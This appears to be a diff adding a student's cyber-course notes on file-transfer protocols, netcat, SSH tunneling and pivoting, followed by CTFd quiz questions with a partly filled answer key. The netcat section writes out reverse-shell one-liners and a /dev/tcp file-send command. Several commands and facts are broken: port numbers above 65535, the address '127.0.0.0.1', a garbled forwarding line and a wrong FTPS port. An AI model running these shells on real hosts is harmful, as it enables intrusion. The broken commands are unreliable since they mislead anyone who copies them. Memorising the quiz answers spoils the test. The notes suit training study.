@@ -1,0 +1,341 @@
+------------------------------------------------------------------------------------------------------------------------
+NETWORKING DAY 6 LINKS:
+  STUDENT FG: https://net.cybbh.io/public/networking/latest/lesson-4-movement_redirection/fg.html
+  STUDENT SLIDES: https://net.cybbh.io/-/public/-/jobs/842494/artifacts/modules/networking/slides/3-Network_Reconnaissance.html
+------------------------------------------------------------------------------------------------------------------------
+GENERAL NOTES
+DATA PROTOCOLS: TFTP, FTP, SFTP, FTPS, SCP, Netcat
+TFTP:
+  RFC 1350 REV2
+  UDP TRANSPORT
+  EXTREMELY SMALL AND VERY SIMPLE COMMUNICATION
+  NO TERMINAL COMMUNICATION ()
+  INSECURE (NO AUTHENTICATION OR ENCRYPTION)
+  NO DIRECTORY SERVICES
+  USED OFTEN FOR TECHNOLOGIES SUCH AS BOOTP AND PXE
+------------
+FTP:
+  FILE TRANSFER PROTOCOL
+  RFC 959
+  TCP TRANSPORT
+  USES MULTIPLE TCP CONNECTIONS
+  CONTROL CONNECTION (21) / DATA CONNECTION (20)
+  AUTHENTICATION THROUGH CLEAR-TEXT SIGN IN (USERNAME AND PASSWORD)
+  INSECURE IN DEFAULT CONFIGURATION
+  HAS DIRECTORY SERVICES
+  CAN BE ENHANCED WITH SSL/TLS (FTPS)
+  ANONYMOUS LOGIN
+SFTP:
+  SECURE FILE TRANSFER PROTOCOL
+  TCP TRANSPORT (TCP PORT 22)
+  USES SYMMETRIC AND ASYMMETRIC ENCRYPTION
+  ADDS FTP LIKE SERVICES TO SSH
+  AUTHENTICATION THROUGH SIGN IN (USERNAME AND PASSWORD) OR WITH SSH KEY
+  INTERACTIVE TERMINAL ACCESS
+------------
+FTPS:
+  FILE TRANSFER PROTOCOL SECURE
+  TCP TRANSPORT (TCP PORT 443)
+  ADDS SSL/TLS ENCRYPTION TO FTP
+  AUTHENTICATION WITH USERNAME/PASSWORD AND/OR PKI
+  INTERACTIVE TERMINAL ACCESS
+------------
+SCP
+  SECURE COPY PROTOCOL
+  TCP TRANSPORT (TCP PORT 22)
+  USES SYMMETRIC AND ASYMMETRIC ENCRYPTION
+  AUTHENTICATION THROUGH SIGN IN (USERNAME AND PASSWORD) OR WITH SSH KEY
+  NON INTERACTIVE
+  SCP SYNTAX:
+    DOWNLOAD A FILE FROM A REMOTE DIRECTORY TO A LOCAL DIRECTORY
+      $ SCP STUDENT@172.16.82.106:SECRETSTUFF.TXT /HOME/STUDENT
+    UPLOAD A FILE TO A REMOTE DIRECTORY FROM A LOCAL DIRECTORY
+      $ SCP SECRETSTUFF.TXT STUDENT@172.16.82.106:/HOME/STUDENT
+    COPY A FILE FROM A REMOTE HOST TO A SEPARATE REMOTE HOST
+      $ SCP -3 STUDENT@172.16.82.106:/HOME/STUDENT/SECRETSTUFF.TXT STUDENT@172.16.82.112:/HOME/STUDENT
+  SCP SYNTAX W/ ALTERNATE SSHD:
+    DOWNLOAD A FILE FROM A REMOTE DIRECTORY TO A LOCAL DIRECTORY
+      scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student
+    UPLOAD A FILE TO A REMOTE DIRECTORY FROM A LOCAL DIRECTORY:
+      scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student
+  SCP SYNTAX THROUGH A TUNNEL:
+    ssh student@172.16.82.106 -L 1111:localhost:22 -NT
+    DOWNLOAD A FILE FROM A REMOTE DIRECTORY TO A LOCAL DIRECTORY
+      scp -P 1111 student@localhost:secretstuff.txt /home/student
+    UPLOAD A FILE TO A REMOTE DIRECTORY FROM A LOCAL DIRECTORY
+      scp -P 1111 secretstuff.txt student@localhost:/home/student
+------------
+NETCAT:
+NETCAT IS THE "SWISS ARMY KNIFE" NETWORKING UTILITY WHICH READS AND WRITES DATA ACROSS NETWORK SOCKET CONNECTIONS USING THE TCP/IP PROTOCOL. 
+IT IS DESIGNED TO BE A RELIABLE "BACK END" TOOL THAT CAN BE USED DIRECTLY OR EASILY DRIVEN BY OTHER PROGRAMS AND SCRIPTS.
+CAN BE USED FOR THE FOLLOWING:
+  INBOUND AND OUTBOUND CONNECTIONS, TCP/UDP, TO OR FROM ANY PORTS
+  TROUBLESHOOTING NETWORK CONNECTIONS
+  SENDING/RECEIVING DATA (INSECURELY)
+  NETCAT: CLIENT TO LISTENER FILE TRANSFER:
+    Client (sends file): nc 10.2.0.2 9001 < file.txt
+    Listener (receive file): nc -l -p 9001 > newfile.txt
+  NETCAT: LISTENER TO CLIENT FILE TRANSFER
+    Listener (sends file): nc -l -p 9001 < file.txt
+    Client (receive file): nc 10.2.0.2 9001 > newfile.txt
+  NETCAT RELAY DEMOS:
+    On Client Relay:
+      mknod mypipe p
+      nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
+    On Listener2 (sends info):
+      nc -l -p 9002 < infile.txt
+    On Listener1 (receives info):
+      nc -l -p 9001 > outfile.txt
+    WRITES THE OUTPUT TO Listener1 AND Listener2 THROUGH THE NAMED PIPE
+  FILE TRANSFER WITH /DEV/TCP:
+    On the receiving box:
+      nc -l -p 1111 > file.txt
+    On the sending box:
+      cat file.txt > /dev/tcp/10.2.0.2/1111
+    THIS METHOD IS USEFUL FOR HOST THAT DOES NOT HAVE NETCAT AVAILABLE.
+  REVERSE SHELL USING NETCAT:
+    When shelled into the remote host using -c :
+      nc -c /bin/sh <your ip> <any unfiltered port>
+    YOU COULD EVEN PIPE BASH THROUGH NETCAT:
+      /bin/sh | nc <your ip> <any unfiltered port>
+    THEN LISTEN FOR THE SHELL:
+      nc -l -p <same unfiltered port> -vvv
+    YOU CAN ALSO LISTEN USING THE -e WITH NETCAT:
+      nc -l -p <any unfiltered port> -e /bin/bash
+------------
+SSH:
+  VARIOUS IMPLEMENTATIONS (V1 AND V2)
+  PROVIDES AUTHENTICATION, ENCRYPTION, AND INTEGRITY.
+  ALLOWS REMOTE TERMINAL SESSIONS
+  USED FOR TUNNELING
+  CREATED AS A SECURE REPLACEMENT FOR BERKELEY REMOTE COMMANDS:
+  RSH - REPLACED WITH SSH, PROVIDES A CHANNEL FOR RUNNING A SHELL ON A REMOTE COMPUTER.
+  RLOGIN - REPLACED WITH RLOGIN, PROVIDES REMOTE
+  SSH PORT FORWARDING:
+    CREATES CHANNELS USING SSH-CONN PROTOCOL
+    ALLOWS FOR TUNNELING OF OTHER SERVICES THROUGH SSH
+    PROVIDES INSECURE SERVICES ENCRYPTION
+  ------
+  SSH LOCAL PORT FORWARDING (SYNTAX AS FOLLOWS):
+      ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
+    OR:
+      ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT
+    EXAMPLE:
+    CREATES A LOCAL PORT (1111) ON THE LOCAL HOST THAT FORWARDS TO A TARGET MACHINE’S PORT 80.
+      ssh student@172.16.82.106 -L 1111:localhost:80 -NT
+    OR:
+      ssh -L 1111:localhost:80 student@172.16.82.106 -NT
+  SSH LOCAL PORT FORWARDING THROUGH A LOCAL PORT:
+    Internet Host:
+      ssh student@172.16.1.15 -L 1111:172.16.40.10:22 -NT
+      ssh student@localhost -p 1111 -L 2222:172.16.82.106:80 -NT
+      firefox localhost:2222
+      CREATES AN ADDITIONAL LOCAL PORT ON THE LOCAL HOST THAT FORWARDS TO A TARGET MACHINE THROUGH THE PREVIOUS CHANNEL CREATED.
+  ------
+  SSH DYNAMIC PORT FORWARDING (SYNTAX AS FOLLOWS):
+      ssh -D <port> -p <alt port> <user>@<pivot ip> -NT
+    PROXYCHAINS DEFAULT PORT IS 9050
+    CREATES A DYNAMIC SOCKS4 PROXY THAT INTERACTS ALONE, OR WITH A PREVIOUSLY ESTABLISHED REMOTE OR LOCAL PORT FORWARD.
+    ALLOWS THE USE OF SCRIPTS AND OTHER USERSPACE PROGRAMS THROUGH THE TUNNEL.
+  SSH DYNAMIC PORT FORWARDING 1-STEP:
+    Blue Private Host-1:
+    ssh student@172.16.82.106 -D 9050 -NT
+    proxychains ./scan.sh
+    proxychains ssh student@10.10.0.40
+  SSH DYNAMIC PORT FORWARDING 2-STEP:
+    Blue Private Host-1:
+      ssh student@172.16.82.106 -L 1111:10.10.0.40:22 -NT
+      ssh student@localhost -D 9050 -p 1111 -NT
+      proxychains curl ftp://www.onlineftp.ch
+      proxychains wget -r www.espn.com
+      proxychains ./scan.sh
+      proxychains ssh student@172.16.101.2
+  SSH REMOTE PORT FORWARDING (SYNTAX AS FOLLOWS):
+      ssh -p <optional alt port> <user>@<remote ip> -R <remote bind port>:<tgt ip>:<tgt port> -NT
+    OR:
+      ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<remote ip> -NT
+    EXAMPLE:
+    CREATES A REMOTE PORT ON THE REMOTE’S LOCAL HOST THAT FORWARDS TO THE TARGET SPECIFIED.
+      Blue Host-1
+        ssh student@10.10.0.40 -R 1111:localhost:80 -NT
+  SSH REMOTE AND LOCAL PORT FORWARDING (EXAMPLE AS FOLLOWS):
+    Blue Private Host-1:
+      ssh student@172.16.82.106 -R 1111:localhost:22 -NT
+    Internet Host:
+      ssh student@172.16.82.106 -L 2222:localhost:1111 -NT
+    Internet Host:
+      ssh localhost -p 2222
+------------
+COVERT CHANNEL NOTES:
+  - METHOD OF INFORMATION OBJECT TRANSFER BETWEEN ENDPOINTS THAT SHOULD BE ILLEGAL BASED ON CURRENT POLICY
+  - TUNNEL STRATEGIES EMPLOYED FOR THIS PURPOSE INCLUDE: ICMP, DNS, HTTP
+
+wire diagram 
+- every port on box
+- more for admin
+physica diagram
+- what we cover in cosc
+- map of physical devices, how routed and connected
+- admin, cyber, emphasis on interfaces and data travel
+high tier map (logical)
+- highest level, imagine zoomed out
+- ideally, map is preexisting
+- however, must be able to construct and validate map
+- typically, map made by network admin (assume poor quality)
+-maps are either for briefs or for teams, for presentation or functionality/utility
+-include services and port associations wherever relevant, and display policies allowing these to be used
+-display or be aware of policy exceptions or where they should exist but do not
+-for monitoring network traffic 
+------------
+LOCAL SSH PORT FORWARDING: ONE PORT OPENED ON YOUR MACHINE! EXAMPLE: 
+SSH ON PORT 1000, BUT PO41700:localhost:41700RT 22 BLOCKED: 
+- DEPENDS ON WHERE BLOCKED
+- SSH AND PORT FORWARDING ARE NOT EQUIVALENT CONCEPTS
+--SSH FUNCTIONALITY:
+-PORT CONVENTION - 41700-41799
+-RECOMMENDED PATTERN: LOCAL PORT FORWARDS, START LOW, REMOTE, START HIGH
+
+ssh -L 421700:127.0.0.1:80 user@tobias -NT A COMMAND BEING SENT TO TOBIAS HOST
+wget -r 127.0.0.1:41700 ACTUALLY OCCURING ON THE LOCAL HOST
+ssh
+
+ssh user@tobias -L 42100:colby_ip:22 -NT
+IN ORDER TO ACCESS COLBY, USE LOCAL PORT 42100 IN THIS EXAMPLE
+ALWAYS BOUND TO AND ONLY TO LOOPBACK ON LOCAL HOST!
+
+ssh firstDev@firstDev -L 421700:secondDev:22 -NT
+ssh -p 421700 secondDev@127.0.0.1
+
+ssh -p 421700 secondDev@127.0.0.1 -L 421701 @thirdDev:25 -NT
+telnet 127.0.0.0.1 421701
+ehlo
+THE PRECEEDING TWO LINES TEST THE CONNECTION SET UP WITH THIRD DEV OVER 421701
+NOW FROM thirdDev:
+------------------------------------------------------------------------------------------------------------------------
+CTFD CHALLENGES
+1. Tunnel Prep – What is localhost 5
+What is the word "localhost" associated with? (Max 2 Attempts)
+A. Loopback address B. 127.0.0.1 C. Both A and B. D. None of the above.
+  ANSWER: C
+2. Tunnel Prep – Alternate port 1 5
+Using the following syntax:
+OPS$ ssh cctc@10.50.1.150 -p 1111 What is 1111? (Max 2 Attempts)
+A. nothing. Incorrect syntax B. alternate ssh port on 10.50.1.150 C. local listening port on OPS D. port mapped to localhost on 10.50.1.150
+  ANSWER: B
+3. Tunnel Prep – Alternate port 2 5
+Using the following syntax:
+OPS$ ssh cctc@localhost -p 1111 What is 1111? (Max 2 Attempts)
+A. nothing. Incorrect syntax B. alternate ssh port on 10.50.1.150 C. local listening port on OPS D. port mapped to localhost on 10.50.1.150
+  ANSWER: 
+Tunnel Prep – Fill in the blank 5
+Using the Tunnels Prep Diagram provided in the start to this task, please fill in the blanks to complete the following ssh command. Which IP would we use to SSH to PC1 from OPS? ssh cctc@__________
+  ANSWER: 
+4. Tunnel Prep – Fill in the blank 5
+Using the Tunnels Prep Diagram provided in the start to this task, please fill in the blanks to complete the following ssh command.
+Which IP would we use to SSH to PC1 from OPS? ssh cctc@__________
+  ANSWER: 10.50.1.150
+5. Tunnel Prep – Dynamic 5
+Using the Tunnels Prep Diagram provided in the start to this task, please fill in the blanks to complete the following ssh command.
+Which ssh syntax would properly setup a Dynamic tunnel to PC1? (Max 2 Attempts)
+A. ssh -D 9050 cctc@localhost -NT B. ssh cctc@100.1.1.1 -D 9050 -NT C. ssh cctc@10.50.1.150 -D 9050 -NT D. ssh -L 9050 cctc@10.50.1.150 -NT
+  ANSWER: C
+6. Tunnel Prep – Local to SSH 5
+Using the Tunnels Prep Diagram provided in the start to this task, please fill in the blanks to complete the following ssh command.
+Which ssh syntax would properly setup a Local tunnel to PC1 SSH port? (Max 2 Attempts)
+A. ssh -L 1111:localhost:22 cctc@10.50.1.150 -NT B. ssh cctc@10.50.1.150 -L 1111:10.50.1.150:22 -NT C. ssh cctc@100.1.1.1 -L 1111:localhost:22 -NT D. ssh -R 1111:localhost:22 cctc@10.50.1.150 -NT
+  ANSWER: A
+7. Tunnel Prep – Local to HTTP 5
+Using the Tunnels Prep Diagram provided in the start to this task, please fill in the blanks to complete the following ssh command.
+Which ssh syntax would properly setup a Local tunnel to PC1 HTTP port? (Max 2 Attempts)
+A. ssh cctc@100.1.1.1 -L 1111:10.50.1.150:80 -NT B. ssh cctc@10.50.1.150 -L 1111:localhost:80 -NT C. ssh cctc@100.1.1.1 -L 1111:localhost:80 -NT D. ssh -L 1111:100.1.1.1:80 cctc@localhost -NT
+  ANSWER: B
+8. Tunnel Prep – Dynamic thru 1st Local 5
+Using the Tunnels Prep Diagram provided in the start to this task, please fill in the blanks to complete the following ssh command.
+Which ssh syntax would allow us to establish a Dynamic tunnel using the Local tunnel created in Question 6? (Max 2 Attempts)
+A. ssh -D 9050 cctc@localhost -NT B. ssh cctc@100.1.1.1 -p 1111 -D 9050 -NT C. ssh -p 1111 cctc@10.50.1.150 -D 9050 -NT D. ssh -D 9050 cctc@localhost -p 1111 -NT
+  ANSWER: 
+9. Tunnel Prep – Pull HTTP thru Local 5
+Using the Tunnels Prep Diagram provided in the start to this task, please fill in the blanks to complete the following ssh command.
+Which syntax would allow us to download the webpage of PC1 using the Local tunnel created in Question 7? (Max 2 Attempts)
+A. wget -r http://100.1.1.1:1111 B. wget -r http://100.1.1.1 C. wget -r http://localhost:1111 D. wget -r http://localhost -p 1111
+  ANSWER: C
+10. Tunnel Prep – Pull HTTP thru Dynamic 5
+Using the Tunnels Prep Diagram provided in the start to this task, please fill in the blanks to complete the following ssh command.
+Which syntax would allow us to download the webpage of PC2 using the Dynamic tunnel created in Question 8? (Max 2 Attempts)
+A. proxychains wget -r http://100.1.1.2:1111 B. proxychains wget -r http://100.1.1.2 C. proxychains curl http://100.1.1.2 D. wget -r http://localhost:1111
+  ANSWER: B
+11. Tunnel Prep – Local to 2nd Pivot SSH 5
+Using the Tunnels Prep Diagram provided in the start to this task, please fill in the blanks to complete the following ssh command.
+Which ssh syntax would properly setup a Local tunnel to PC2 SSH port using PC1 as your pivot? (Max 2 Attempts)
+A. ssh cctc@10.50.1.150 -L 1111:192.168.2.1:22 -NT B. ssh -L 1111:100.1.1.2:22 cctc@100.1.1.1 -NT C. ssh -L 1111:100.1.1.2:22 cctc@10.50.1.150 -p 1111 -NT D. ssh cctc@10.50.1.150 -L 1111:100.1.1.2:22 -NT
+  ANSWER: D
+12. Tunnel Prep – 2nd Local thru 1st Local SSH 5
+Using the Tunnels Prep Diagram provided in the start to this task, please fill in the blanks to complete the following ssh command.
+Which ssh syntax would properly setup a 2nd Local tunnel to PC2 SSH port using the tunnel made in Question 6 as your first tunnel? (Max 2 Attempts)
+A. ssh -L 2222:100.1.1.2:22 cctc@localhost -p 1111 -NT B. ssh -L 2222:100.1.1.2:22 cctc@10.50.1.150 -p 1111 -NT C. ssh cctc@100.1.1.1 -p 1111 -L 2222:100.1.1.2:22 -NT D. ssh cctc@localhost -p 1111 -L 2222:192.168.2.1:22 -NT
+  ANSWER: 
+15. Tunnel Prep – What’s Wrong 1 5
+Using the Tunnels Prep Diagram provided in the start to this task, please fill in the blanks to complete the following ssh command.
+An Admin created the following tunnels but found that the Dynamic tunnel would not connect. Where did the Admin make the error? (Max 2 Attempts)
+1.) ssh cctc@10.50.1.150 -L 1234:100.1.1.2:22 -NT
+2.) ssh -D 9050 cctc@100.1.1.2 -p 1234 -NT
+A. targeted wrong IP in line 1 B. authenticated to wrong IP in line 1 C. authenticated to wrong IP in line 2 D. called wrong port in line 2
+  ANSWER: C
+16. Tunnel Prep – What’s Wrong 25
+Using the Tunnels Prep Diagram provided in the start to this task, please fill in the blanks to complete the following ssh command.
+An Admin created the following tunnels but found that the Dynamic tunnel would not connect. Where did the Admin make the error? (Max 2 Attempts)
+1.) ssh cctc@10.50.1.150 -L 1234:192.168.2.1:22 -NT
+2.) ssh -L 4321:100.1.1.2:22 cctc@localhost -p 1234 -NT
+3.) ssh cctc@localhost -p 4321 -D 9050 -NT
+A. targeted wrong IP in line 1 B. targeted wrong IP in line 2 C. called wrong port in line 2 D. called wrong port in line 3
+  ANSWER: 
+18. Tunnel Prep – Telnet to 3rd Pivot 5
+Using the Tunnels Prep Diagram provided in the start to this task, please fill in the blanks to complete the following ssh command.
+Which syntax would allow us to telnet to PC3 using the tunnel make in Question 17? (Max 2 Attempts)
+A. telnet localhost:3333 B. telnet localhost 3333 C. telnet 192.168.2.2 3333 D. telnet localhost -p 3333
+  ANSWER: 
+19. Tunnel Prep – Remote 5
+Using the Tunnels Prep Diagram provided in the start to this task, please fill in the blanks to complete the following ssh command.
+Which syntax would properly setup a Remote tunnel from PC3 back to PC2 using PC3 SSH port as the target? (Max 2 Attempts)
+A. ssh cctc@localhost -p 3333 -R 4444:localhost:22 -NT B. ssh cctc@192.168.2.1 -R 4444:localhost:23 -NT C. ssh -R 4444:localhost:22 cctc@192.168.2.1 -NT D. ssh -R 4444:192.168.2.2:22 cctc@localhost -NT
+  ANSWER: C
+20. Tunnel Prep – Local to Remote 5
+Using the Tunnels Prep Diagram provided in the start to this task, please fill in the blanks to complete the following ssh command.
+Which syntax would properly setup a Local tunnel to map to the tunnel made in Question 19 using the tunnel made in Question 6 and Question 12? (Max 2 Attempts)
+A. ssh cctc@localhost -p 2222 -L 5555:localhost:4444 -NT B. ssh cctc@localhost -p 2222 -L 5555:100.1.1.1:4444 -NT C. ssh -L 5555:localhost:4444 -p 2222 cctc@100.1.1.1 -NT D. ssh -L 5555:192.168.2.2:22 -p 4444 cctc@100.1.1.1 -NT
+  ANSWER: 
+13. Tunnel Prep – 2nd Local thru 1st Local HTTP
+5
+Using the Tunnels Prep Diagram provided in the start to this task, please fill in the blanks to complete the following ssh command.
+
+Which ssh syntax would properly setup a 2nd Local tunnel to PC2 HTTP port using the tunnel made in Question 6 as your first tunnel? (Max 2 Attempts)
+
+A. ssh -L 2222:192.168.2.1:80 cctc@localhost -p 1111 -NT
+B. ssh cctc@localhost -p 1111 -L 2222:100.1.1.2:80 -NT
+C. ssh cctc@10.50.1.150 -p 1111 -L 2222:100.1.1.2:80 -NT
+D. ssh -L 2222:100.1.1.2:80 cctc@100.1.1.1 -p 1111 -NT
+ANSWER: B
+17. Tunnel Prep – Local to 3rd Pivot TELNET
+5
+Using the Tunnels Prep Diagram provided in the start to this task, please fill in the blanks to complete the following ssh command.
+
+Which ssh syntax would properly setup a 3rd Local tunnel to PC3 TELNET port using the tunnels made in Question 6 and Question 12? (Max 2 Attempts)
+
+A. ssh -L 3333:192.168.2.2:23 -p 2222 cctc@100.1.1.1 -NT
+B. ssh -p 2222 cctc@localhost -L 3333:192.168.2.1:23 -NT
+C. ssh -L 3333:192.168.2.2:23 cctc@localhost -NT
+D. ssh -p 2222 cctc@localhost -L 3333:192.168.2.2:23 -NT
+ANSWER: D
+
+
+
+
+
+
+
+
+
+
+
+
+eee
